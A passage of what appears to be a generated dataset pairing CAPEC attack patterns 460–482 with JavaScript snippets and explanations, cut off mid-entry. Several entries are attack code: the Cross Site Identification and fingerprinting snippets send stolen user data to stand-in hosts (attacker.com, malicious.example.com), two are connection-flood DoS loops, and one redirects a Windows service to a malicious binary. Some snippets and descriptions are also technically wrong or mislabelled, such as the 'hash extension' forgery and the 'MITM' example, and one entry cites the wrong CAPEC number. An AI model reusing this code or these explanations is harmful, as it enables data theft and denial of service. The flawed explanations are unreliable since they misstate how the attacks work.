        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "const crypto = require('crypto');\nconst fs = require('fs');\n\n// Simulate generating a CSR with a weak hash algorithm (MD5)\nfunction generateCSR(data) {\n  return crypto.createHash('md5').update(data).digest('hex');\n}\n\n// Simulate a trusted CA signing the CSR\nfunction signCSR(csr) {\n  // In a real scenario, this would involve the CA's private key\n  return `signed(${csr})`;\n}\n\n// Generate two different CSRs with the same hash (collision)\nconst csr1 = generateCSR('legitimate request');\nconst csr2 = generateCSR('malicious request');\n\n// Trusted CA signs the first CSR\nconst signedCSR = signCSR(csr1);\n\n// Attacker uses the signed blob for the second CSR\nconst rogueCertificate = signedCSR.replace(csr1, csr2);\n\nconsole.log('Legitimate CSR:', csr1);\nconsole.log('Malicious CSR:', csr2);\nconsole.log('Signed CSR:', signedCSR);\nconsole.log('Rogue Certificate:', rogueCertificate);\n\n// Simulate improper certificate validation\nfunction validateCertificate(cert) {\n  // In a real scenario, this would involve checking the certificate chain and host\n  return cert.startsWith('signed(');\n}\n\nif (validateCertificate(rogueCertificate)) {\n  console.log('Rogue certificate validated successfully!');\n} else {\n  console.log('Rogue certificate validation failed.');\n}",
        "description": "This JavaScript code snippet demonstrates the concept of creating a rogue certification authority certificate by exploiting a weak hashing algorithm (MD5) to generate certificate signing requests (CSRs) with collision blocks. The code simulates generating two different CSRs that hash to the same value, having a trusted certificate authority (CA) sign one of them, and then using the signed blob to create a second, rogue certificate. The code also includes a basic validation function that improperly validates the rogue certificate, highlighting the potential security risks associated with using broken or risky cryptographic algorithms and improper certificate validation."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const url = new URL(req.url, `http://${req.headers.host}`);\n  const params = url.searchParams;\n\n  // Vulnerable to HTTP Parameter Pollution\n  const user = params.get('user');\n  const role = params.get('role');\n\n  // Simulate sensitive operation based on parameters\n  if (user && role) {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`User: ${user}, Role: ${role}`);\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Missing parameters');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server processes incoming GET requests and extracts 'user' and 'role' parameters from the query string. The code is vulnerable to HTTP Parameter Pollution (HPP) because it does not handle duplicate parameters correctly. An attacker could inject additional 'user' or 'role' parameters to manipulate the application's behavior. For example, a request to 'http://127.0.0.1:8080/?user=admin&role=admin&user=attacker' could lead to unexpected behavior. This snippet also touches on related CWEs: improper handling of extra parameters (CWE-235), use of GET request method with sensitive query strings (CWE-598), and improper neutralization of input terminators (CWE-147)."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak hash function (MD5) used for generating signature\nfunction generateSignature(params, secret) {\n  const hash = crypto.createHash('md5');\n  hash.update(params + secret);\n  return hash.digest('hex');\n}\n\n// Simulated web service request\nfunction webServiceRequest(params, signature) {\n  const secret = 'supersecret'; // Secret token known only to the server\n  const expectedSignature = generateSignature(params, secret);\n  if (signature === expectedSignature) {\n    console.log('Authentication successful');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Adversary's attempt to forge a signature using hash extension attack\nconst maliciousParams = 'user=admin&role=superuser';\nconst forgedSignature = generateSignature(maliciousParams, ''); // Secret is unknown\nwebServiceRequest(maliciousParams, forgedSignature);",
        "description": "This JavaScript code snippet demonstrates a web service authentication mechanism that uses a weak hash function (MD5) to generate a signature for request parameters. The `generateSignature` function combines the request parameters with a secret token to create a hash. The `webServiceRequest` function simulates a web service that verifies the signature against the expected value. An adversary attempts to forge a signature by exploiting the hash function's extension weakness, generating a signature without knowing the secret token. This example highlights vulnerabilities such as the use of a weak hash function (CWE-328), potential for authentication bypass (CWE-290, CWE-305), and weak authentication mechanisms (CWE-1390)."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "const urls = ['https://example.com/resource1', 'https://example.com/resource2'];\n\nfunction measureTiming(url) {\n  return new Promise((resolve) => {\n    const start = performance.now();\n    fetch(url, { mode: 'no-cors' }).then(() => {\n      const end = performance.now();\n      resolve(end - start);\n    }).catch(() => {\n      const end = performance.now();\n      resolve(end - start);\n    });\n  });\n}\n\nasync function timeRequests() {\n  for (const url of urls) {\n    const time = await measureTiming(url);\n    console.log(`Time for ${url}: ${time}ms`);\n  }\n}\n\ntimeRequests();",
        "description": "This JavaScript code snippet demonstrates a Cross-Domain Search Timing attack. The code initiates cross-domain HTTP GET requests to a list of URLs and measures the time taken for each request to complete. The 'fetch' function is used with 'no-cors' mode to bypass the same-origin policy, which prevents reading the response but allows timing the request. The 'performance.now()' function is used to measure the time before and after the request. The timing information is then logged to the console. This timing data can potentially reveal information about the server's state or the presence of certain resources, embodying the main idea of CAPEC-115. The related CWEs provide additional context, such as the use of covert timing channels (CWE-385) and observable timing discrepancies (CWE-208)."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "const crypto = require('crypto');\n\nfunction decrypt(ciphertext, key) {\n  const decipher = crypto.createDecipheriv('aes-256-cbc', key, ciphertext.slice(0, 16));\n  let decrypted = Buffer.concat([decipher.update(ciphertext.slice(16)), decipher.final()]);\n  try {\n    // Check padding\n    const paddingLength = decrypted[decrypted.length - 1];\n    if (paddingLength > 16) throw new Error('Invalid padding');\n    for (let i = 1; i <= paddingLength; i++) {\n      if (decrypted[decrypted.length - i] !== paddingLength) throw new Error('Invalid padding');\n    }\n    decrypted = decrypted.slice(0, -paddingLength);\n  } catch (e) {\n    console.error('Padding error:', e.message);\n    return null; // Leaking padding error information\n  }\n  return decrypted;\n}\n\n// Example usage\nconst key = crypto.randomBytes(32);\nconst iv = crypto.randomBytes(16);\nconst cipher = crypto.createCipheriv('aes-256-cbc', key, iv);\nlet ciphertext = Buffer.concat([iv, cipher.update('Sensitive data'), cipher.final()]);\n\nconsole.log(decrypt(ciphertext, key));",
        "description": "This JavaScript code snippet demonstrates a vulnerable decryption function that is susceptible to a Padding Oracle Crypto Attack. The function `decrypt` takes a ciphertext and a key, and attempts to decrypt the ciphertext using AES-256-CBC. After decryption, it checks the padding of the decrypted data. If the padding is invalid, it throws an error and logs a padding error message. This leakage of padding error information can be exploited by an attacker to decrypt the ciphertext without knowing the key, as described in the CAPEC. The code also highlights CWE-209 (Generation of Error Message Containing Sensitive Information) by logging the padding error, and CWE-649 (Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking) by not performing integrity checks on the ciphertext."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "function setEvercookie(name, value) {\n    var storage = [localStorage, sessionStorage, document.cookie];\n    var flashLSO = new FlashLSO(); // Hypothetical Flash Local Shared Object API\n    var userData = new UserData(); // Hypothetical UserData API\n\n    function saveToAllStorages() {\n        storage.forEach(function(store) {\n            if (store === document.cookie) {\n                document.cookie = name + '=' + value + '; path=/';\n            } else {\n                store.setItem(name, value);\n            }\n        });\n        flashLSO.setItem(name, value);\n        userData.setItem(name, value);\n    }\n\n    function restoreFromAnyStorage() {\n        var restoredValue = null;\n        storage.forEach(function(store) {\n            if (store === document.cookie) {\n                var match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));\n                if (match) restoredValue = match[2];\n            } else if (store.getItem(name)) {\n                restoredValue = store.getItem(name);\n            }\n        });\n        if (flashLSO.getItem(name)) restoredValue = flashLSO.getItem(name);\n        if (userData.getItem(name)) restoredValue = userData.getItem(name);\n        return restoredValue;\n    }\n\n    var existingValue = restoreFromAnyStorage();\n    if (existingValue !== value) {\n        saveToAllStorages();\n    }\n}\n\n// Usage\nsetEvercookie('userSession', 'sensitiveData');",
        "description": "This JavaScript code snippet demonstrates the concept of an 'evercookie', which is a highly persistent cookie that remains on the user's machine even after attempts to delete it. The code stores the cookie in multiple locations, including localStorage, sessionStorage, document.cookie, and hypothetical Flash Local Shared Objects (LSO) and UserData APIs. If the cookie is deleted from some but not all locations, it is restored from the remaining locations, ensuring its persistence. This approach can lead to several security issues, such as exposure of private information (CWE-359), use of persistent cookies containing sensitive information (CWE-539), and reliance on cookies without validation and integrity checking (CWE-784, CWE-565). Additionally, storing sensitive information in cleartext in a cookie (CWE-315) is demonstrated in the code."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "const http = require('http');\n\nconst proxy = http.createServer((req, res) => {\n  const options = {\n    hostname: 'example.com',\n    port: 80,\n    path: req.url,\n    method: req.method,\n    headers: req.headers\n  };\n\n  const proxyReq = http.request(options, (proxyRes) => {\n    proxyRes.pipe(res, {\n      end: true\n    });\n  });\n\n  req.pipe(proxyReq, {\n    end: true\n  });\n});\n\nproxy.listen(8080, () => {\n  console.log('Proxy server is running on port 8080');\n});",
        "description": "This JavaScript code snippet sets up a basic HTTP proxy server using Node.js. The proxy server listens on port 8080 and forwards incoming client requests to 'example.com'. The proxy server does not modify the requests or responses, making it transparent to the client. This code embodies the main idea of CAPEC-171 (Transparent Proxy Abuse) by acting as an intermediary that forwards requests and responses without the client's knowledge. The code also touches on related CWEs: \n- CWE-441 (Unintended Proxy or Intermediary) as the proxy server forwards requests without preserving the original source.\n- CWE-444 (Inconsistent Interpretation of HTTP Requests) as the proxy server may not handle malformed HTTP requests consistently.\n- CWE-602 (Client-Side Enforcement of Server-Side Security) as the proxy relies on the client to enforce security.\n- CWE-212 (Improper Removal of Sensitive Information) as the proxy does not remove sensitive information before forwarding.\n- CWE-941 (Incorrectly Specified Destination) as the proxy could potentially forward requests to incorrect destinations if not properly configured."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "const targetUrl = 'http://example.com/api/data';\n\nfetch(targetUrl)\n  .then(response => response.json())\n  .then(data => {\n    console.log('Data received:', data);\n  })\n  .catch(error => {\n    console.error('Error fetching data:', error);\n  });\n\n// Simulating an attacker intercepting the request\nconst attackerUrl = 'http://malicious.com/api/data';\n\nfetch(attackerUrl)\n  .then(response => response.json())\n  .then(data => {\n    console.log('Intercepted data:', data);\n  })\n  .catch(error => {\n    console.error('Error intercepting data:', error);\n  });",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can intercept and manipulate requests between a victim's browser and a non-sensitive website that does not use TLS, leveraging an active adversary in the middle attack to bypass the same origin policy. The code first makes a fetch request to a target URL (http://example.com/api/data) and logs the received data. It then simulates an attacker intercepting the request by making a fetch request to a malicious URL (http://malicious.com/api/data) and logging the intercepted data. This example highlights the vulnerability described in CAPEC-94 and related CWEs, such as CWE-300 (Channel Accessible by Non-Endpoint) and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), by showing how an attacker can exploit insecure communication channels to access or manipulate data."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "const socialNetworkAPI = 'https://socialnetwork.com/api/userinfo';\n\nfunction stealUserInfo() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('GET', socialNetworkAPI, true);\n  xhr.onreadystatechange = function() {\n    if (xhr.readyState === 4 && xhr.status === 200) {\n      const userInfo = JSON.parse(xhr.responseText);\n      sendToAttacker(userInfo);\n    }\n  };\n  xhr.send();\n}\n\nfunction sendToAttacker(data) {\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://attacker.com/collect', true);\n  xhr.setRequestHeader('Content-Type', 'application/json');\n  xhr.send(JSON.stringify(data));\n}\n\n// Trigger the function to steal user info\nstealUserInfo();",
        "description": "This JavaScript code snippet demonstrates a Cross Site Identification attack. The `stealUserInfo` function sends a GET request to a social networking site's API to retrieve user information. If the user is logged into the social network (e.g., using the 'remember me' feature), the request will succeed, and the user's information will be returned. The `sendToAttacker` function then sends this information to an attacker's server. This code leverages several vulnerabilities: CSRF (CWE-352) by making unauthorized requests, Exposure of Private Personal Information (CWE-359) by accessing user data without consent, and potentially Session Fixation (CWE-384) if the session ID is reused. The use of GET requests (CWE-598) and lack of input neutralization (CWE-79) are also implied risks."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "const targetDomain = 'https://victim.com';\nconst cssUrl = `${targetDomain}/styles.css?cookie=${document.cookie}`;\n\nconst link = document.createElement('link');\nlink.rel = 'stylesheet';\nlink.href = cssUrl;\ndocument.head.appendChild(link);",
        "description": "This JavaScript code snippet demonstrates a Generic Cross-Browser Cross-Domain Theft attack. The attacker creates a link element to load a CSS file from a target domain, appending the victim's cookies to the URL as a query parameter. When the browser requests the CSS file, it sends the cookies to the target domain, potentially exposing sensitive information. This attack leverages improper neutralization (CWE-707) and improper handling of URL encoding (CWE-177) to inject and steal data cross-domain. The code also highlights the risk of cross-site scripting (CWE-79) by manipulating the document's head to include malicious content."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/',\n  method: 'GET',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded'\n  }\n};\n\nfunction flood() {\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {\n      // Keep the connection alive by not ending the response\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.write('data=keep-alive');\n  // Do not call req.end() to keep the connection open\n}\n\nfor (let i = 0; i < 1000; i++) {\n  flood();\n}",
        "description": "This JavaScript code snippet demonstrates an HTTP DoS attack by flooding a target server with HTTP requests and keeping the connections open indefinitely. The 'flood' function creates an HTTP request to the target server and writes data to keep the connection alive without ending it. By running this function multiple times in a loop, the attacker can exhaust the server's resources, leading to a denial of service. This code embodies the main idea of CAPEC-HTTP DoS and leverages CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-410 (Insufficient Resource Pool) by not limiting the number of open connections and overwhelming the server's resource pool."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test_db'\n});\n\napp.use(express.json());\n\napp.post('/execute', (req, res) => {\n  const userInput = req.body.query;\n  connection.query(userInput, (error, results) => {\n    if (error) {\n      return res.status(500).send('Error executing query');\n    }\n    res.send(results);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that connects to a MySQL database. It includes an endpoint '/execute' that takes a SQL query from the request body and executes it directly on the database. This code is vulnerable to SQL Injection (CWE-89) because it directly uses user input in the SQL query without any sanitization or parameterization. An attacker could exploit this to execute arbitrary SQL commands, potentially gaining access to the file system, operating system, or other machines on the network (CAPEC-118). Additionally, the database connection is made with root privileges (CWE-250), which amplifies the potential damage. The code does not handle database cursors properly, which could lead to dangling cursors (CWE-619)."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadLibrary(libName) {\n  const searchPaths = [\n    path.join(__dirname, libName),\n    path.join('/usr/local/lib', libName),\n    path.join('/usr/lib', libName)\n  ];\n\n  for (const searchPath of searchPaths) {\n    if (fs.existsSync(searchPath)) {\n      return require(searchPath);\n    }\n  }\n\n  throw new Error('Library not found');\n}\n\n// Example usage\ntry {\n  const myLib = loadLibrary('myLibrary.js');\n  myLib.doSomething();\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of library loading that embodies the concept of 'Search Order Hijacking' (CAPEC-471). The `loadLibrary` function searches for a library in a predefined set of directories. The search order starts with the current directory (`__dirname`), followed by system directories (`/usr/local/lib` and `/usr/lib`). An attacker could exploit this by placing a malicious library in the current directory, which would be loaded instead of the legitimate one. This vulnerability is related to CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path), as the search path includes directories that could be controlled by an attacker. The code does not verify the integrity or authenticity of the library, making it susceptible to hijacking."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "function getBrowserFingerprint() {\n    var fingerprint = '';\n    fingerprint += 'UserAgent: ' + navigator.userAgent + '\\n';\n    fingerprint += 'Language: ' + navigator.language + '\\n';\n    fingerprint += 'Platform: ' + navigator.platform + '\\n';\n    fingerprint += 'CookiesEnabled: ' + navigator.cookieEnabled + '\\n';\n    fingerprint += 'ScreenResolution: ' + screen.width + 'x' + screen.height + '\\n';\n    fingerprint += 'TimezoneOffset: ' + new Date().getTimezoneOffset() + '\\n';\n    return fingerprint;\n}\n\nfunction sendFingerprint() {\n    var xhr = new XMLHttpRequest();\n    var fingerprint = getBrowserFingerprint();\n    xhr.open('GET', 'http://malicious.example.com/collect?data=' + encodeURIComponent(fingerprint), true);\n    xhr.send();\n}\n\nsendFingerprint();",
        "description": "This JavaScript code snippet demonstrates a basic browser fingerprinting technique. The `getBrowserFingerprint` function collects various pieces of information about the user's browser and environment, such as the user agent, language, platform, cookie settings, screen resolution, and timezone offset. This information is concatenated into a single string. The `sendFingerprint` function then sends this data to a malicious server using an HTTP GET request, embedding the sensitive information in the query string. This snippet embodies the CAPEC concept of browser fingerprinting to gather information for targeted attacks. It also highlights related CWEs, such as the exposure of sensitive information (CWE-200) and the use of GET requests with sensitive data (CWE-598)."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(message, signature, publicKey) {\n  const verifier = crypto.createVerify('SHA1'); // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n  verifier.update(message);\n  return verifier.verify(publicKey, signature, 'hex');\n}\n\nfunction receiveMessage(message, signature, publicKey) {\n  if (verifySignature(message, signature, publicKey)) {\n    console.log('Message is from a trusted source:', message);\n  } else {\n    console.log('Message verification failed.');\n  }\n}\n\n// Simulated message reception\nconst message = 'Important data';\nconst signature = 'fake_signature'; // CWE-290: Authentication Bypass by Spoofing\nconst publicKey = 'fake_public_key';\nreceiveMessage(message, signature, publicKey);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker could spoof a signature, leading the recipient to believe that a message is from a trusted source. The `verifySignature` function uses the SHA1 algorithm, which is considered broken and risky (CWE-327). The `receiveMessage` function attempts to verify the message's signature using a potentially spoofed public key (CWE-290). This code embodies the main idea of the CAPEC by showing how improper cryptographic practices and authentication bypass can lead to signature spoofing, misleading the recipient into trusting a malicious message."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulate insecure storage of private key\nconst privateKey = '-----BEGIN PRIVATE KEY-----\\nMIIBVwIBADANBgkqhkiG9w0BAQEFAASCATwwggE4AgEAAkEAu5...\\n-----END PRIVATE KEY-----';\n\n// Function to sign a message\nfunction signMessage(message) {\n  const sign = crypto.createSign('SHA256');\n  sign.update(message);\n  sign.end();\n  const signature = sign.sign(privateKey, 'hex');\n  return signature;\n}\n\n// Simulate an attacker stealing the private key\nconst stolenPrivateKey = privateKey;\n\n// Attacker uses the stolen key to sign a malicious message\nconst maliciousMessage = 'Transfer $1000 to attacker';\nconst forgedSignature = signMessage(maliciousMessage);\n\nconsole.log('Malicious Message:', maliciousMessage);\nconsole.log('Forged Signature:', forgedSignature);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker steals a private key and uses it to forge a signature on a malicious message. The private key is stored insecurely, making it susceptible to theft (CWE-522). The attacker then uses the stolen key to sign a message, bypassing authentication mechanisms (CWE-290) and potentially misleading a victim into performing actions that benefit the attacker. This embodies the main idea of CAPEC- Signature Spoofing by Key Theft."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(data, signature, publicKey) {\n  const verifier = crypto.createVerify('SHA256');\n  verifier.update(data);\n  verifier.end();\n  // Improper verification: does not check the return value of verify\n  verifier.verify(publicKey, signature);\n}\n\n// Example usage\nconst data = 'Important data';\nconst signature = 'fake_signature';\nconst publicKey = '-----BEGIN PUBLIC KEY-----\\n...\\n-----END PUBLIC KEY-----';\n\nverifySignature(data, signature, publicKey);",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to 'Signature Spoofing by Improper Validation' (CAPEC). The `verifySignature` function uses the `crypto` module to verify a cryptographic signature. However, it fails to properly check the return value of the `verifier.verify` method, which should return a boolean indicating the success or failure of the verification. This improper verification (CWE-347) can be exploited by an adversary to spoof a signature without knowing the key. The code also implicitly highlights the use of potentially risky cryptographic algorithms (CWE-327) and improper certificate validation (CWE-295) by not ensuring the integrity and authenticity of the public key."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(message, signature, publicKey) {\n  const verifier = crypto.createVerify('SHA256');\n  verifier.update(message);\n  verifier.end();\n  return verifier.verify(publicKey, signature, 'hex');\n}\n\nfunction spoofSignature(message, fakeSignature, fakePublicKey) {\n  if (verifySignature(message, fakeSignature, fakePublicKey)) {\n    console.log('Signature verified. Proceeding with action...');\n    // Perform some action assuming the signature is valid\n  } else {\n    console.log('Signature verification failed.');\n  }\n}\n\nconst message = 'Important transaction data';\nconst fakeSignature = 'abcdef1234567890'; // Fake signature\nconst fakePublicKey = '-----BEGIN PUBLIC KEY-----\\n...\\n-----END PUBLIC KEY-----'; // Fake public key\n\nspoofSignature(message, fakeSignature, fakePublicKey);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can spoof a cryptographic signature by misrepresenting the signer's identity. The `verifySignature` function is intended to verify the authenticity of a message using a given signature and public key. However, the `spoofSignature` function uses a fake signature and a fake public key to trick the verification process. If the verification succeeds, it proceeds with an action, assuming the signature is valid. This embodies the CAPEC of 'Signature Spoofing by Misrepresentation' and highlights related CWEs such as 'Improper Verification of Cryptographic Signature' (CWE-347) and 'Authentication Bypass by Spoofing' (CWE-290)."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "function processData(data) {\n  if (data.signed) {\n    // Verify the signature\n    if (!verifySignature(data.content, data.signature)) {\n      throw new Error('Invalid signature');\n    }\n  }\n  // Process the data regardless of signature verification\n  processContent(data.content);\n}\n\nfunction verifySignature(content, signature) {\n  // Dummy signature verification logic\n  return signature === 'valid_signature';\n}\n\nfunction processContent(content) {\n  console.log('Processing content:', content);\n}\n\n// Example usage\nconst signedData = { signed: true, content: 'Sensitive Data', signature: 'invalid_signature' };\nconst unsignedData = { signed: false, content: 'Non-sensitive Data' };\n\nprocessData(signedData); // This will throw an error but still process the content\nprocessData(unsignedData); // This will process the content without any signature verification",
        "description": "This JavaScript code snippet demonstrates a vulnerability where both signed and unsigned data are processed without proper distinction. The `processData` function checks if the data is signed and attempts to verify the signature. However, regardless of the verification result, it proceeds to process the content. This embodies the CAPEC 'Signature Spoofing by Mixing Signed and Unsigned Content' by allowing unsigned or improperly signed data to be processed as if it were valid. The related CWEs are represented as follows: CWE-347 (Improper Verification of Cryptographic Signature) is shown by the dummy `verifySignature` function, CWE-693 (Protection Mechanism Failure) is demonstrated by the lack of proper handling after signature verification, and CWE-196 (Unsigned to Signed Conversion Error) is implied by the potential mishandling of signed and unsigned data."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "const { exec } = require('child_process');\nconst fs = require('fs');\n\n// CWE-284: Improper Access Control\n// CWE-15: External Control of System or Configuration Setting\nconst serviceConfigPath = 'C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\serviceConfig.json';\n\n// CWE-520: .NET Misconfiguration: Use of Impersonation\nconst maliciousBinaryPath = 'C:\\malicious\\malicious.exe';\n\n// Read the current service configuration\nfs.readFile(serviceConfigPath, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Failed to read service configuration:', err);\n    return;\n  }\n\n  let config;\n  try {\n    config = JSON.parse(data);\n  } catch (parseErr) {\n    console.error('Failed to parse service configuration:', parseErr);\n    return;\n  }\n\n  // Modify the service configuration to point to the malicious binary\n  config.executablePath = maliciousBinaryPath;\n\n  // Write the modified configuration back to the file\n  fs.writeFile(serviceConfigPath, JSON.stringify(config, null, 2), 'utf8', (writeErr) => {\n    if (writeErr) {\n      console.error('Failed to write modified service configuration:', writeErr);\n      return;\n    }\n\n    console.log('Service configuration modified successfully.');\n\n    // Restart the service to execute the malicious binary\n    exec('net stop MyService && net start MyService', (execErr, stdout, stderr) => {\n      if (execErr) {\n        console.error('Failed to restart service:', execErr);\n        return;\n      }\n      console.log('Service restarted successfully.');\n    });\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a potential attack where an adversary modifies the configuration of a Windows service to execute a malicious binary. The code reads the current service configuration from a JSON file, modifies the executable path to point to a malicious binary, writes the modified configuration back to the file, and then restarts the service to execute the malicious binary. This embodies the CAPEC 'Modification of Windows Service Configuration' and leverages related CWEs such as Improper Access Control (CWE-284), External Control of System or Configuration Setting (CWE-15), and .NET Misconfiguration: Use of Impersonation (CWE-520)."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// Load a malicious root certificate\nconst maliciousRootCert = fs.readFileSync('malicious-root-cert.pem');\n\n// Create an HTTPS agent that trusts the malicious root certificate\nconst agent = new https.Agent({\n  ca: [maliciousRootCert],\n  rejectUnauthorized: false // CWE-295: Improper Certificate Validation\n});\n\n// Make an HTTPS request to a spoofed website\nhttps.get('https://spoofed-website.com', { agent }, (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => { console.log(data); });\n}).on('error', (e) => { console.error(e); });",
        "description": "This JavaScript code snippet demonstrates how an adversary might exploit a weakness in certificate validation to install a malicious root certificate on a compromised system. The code loads a malicious root certificate and creates an HTTPS agent that trusts this certificate, bypassing proper certificate validation (CWE-295). It then makes an HTTPS request to a spoofed website, which would be trusted by the compromised system due to the malicious root certificate. This can lead to the user unknowingly connecting to an adversary-controlled server, potentially exposing sensitive information such as login credentials. The code highlights the risks associated with improper certificate validation and the importance of correctly following the chain of trust (CWE-296)."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "const vm = require('vm');\n\n// Simulated virtualized environment\nconst sandbox = { user: 'guest', sensitiveData: 'secret' };\n\n// Untrusted code execution\nconst untrustedCode = `\n  // Attempt to escape the sandbox\n  this.process = process;\n  this.require = require;\n  this.fs = require('fs');\n  // Access sensitive data\n  console.log('Sensitive Data:', sensitiveData);\n`;\n\ntry {\n  vm.runInNewContext(untrustedCode, sandbox);\n} catch (e) {\n  console.error('Error executing untrusted code:', e);\n}\n\n// Check if the sandbox was escaped\nif (sandbox.process || sandbox.require || sandbox.fs) {\n  console.error('Sandbox escape detected!');\n}",
        "description": "This JavaScript code snippet demonstrates a simulated virtualized environment using Node.js's 'vm' module. The 'sandbox' object represents a confined environment with limited privileges. The 'untrustedCode' string contains code that attempts to escape the sandbox by accessing Node.js's 'process' and 'require' objects, which would allow it to execute commands or load libraries from an untrusted source (CWE-114). The code also tries to access 'sensitiveData' within the sandbox, representing an attempt to expose sensitive information (CWE-1421, CWE-1423). If the sandbox is successfully escaped, the code logs an error message, indicating a failure in the protection mechanism (CWE-693) and improper isolation (CWE-653). This snippet embodies the main idea of the CAPEC by showing how an adversary might escape a virtualized environment to gain unauthorized access to resources and execute malicious code."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "const https = require('https');\n\nconst options = {\n  hostname: 'trusted-domain.com',\n  port: 443,\n  path: '/api/data',\n  method: 'GET',\n  headers: {\n    'Host': 'malicious-domain.com'\n  }\n};\n\nconst req = https.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log(data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a simplified example of 'Domain Fronting', a technique where contradictory domain names are used in different parts of a request to route traffic inappropriately. The 'hostname' field in the options object is set to 'trusted-domain.com', while the 'Host' header is set to 'malicious-domain.com'. This discrepancy can be exploited to route traffic to an unintended destination, potentially bypassing security measures. This example embodies the main idea of CAPEC-Contradictory Destinations in Traffic Routing Schemes and highlights related weaknesses such as CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) and CWE-941 (Incorrectly Specified Destination in a Communication Channel)."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "const net = require('net');\n\nconst targetHost = '192.168.1.1';\nconst targetPort = 80;\nconst maxConnections = 1000;\nlet connections = 0;\n\nfunction flood() {\n  if (connections < maxConnections) {\n    const client = new net.Socket();\n    client.connect(targetPort, targetHost, () => {\n      console.log('Connected');\n      connections++;\n    });\n    client.on('error', (err) => {\n      console.error('Connection error:', err);\n    });\n    client.on('close', () => {\n      connections--;\n      flood();\n    });\n  }\n}\n\nfor (let i = 0; i < maxConnections; i++) {\n  flood();\n}",
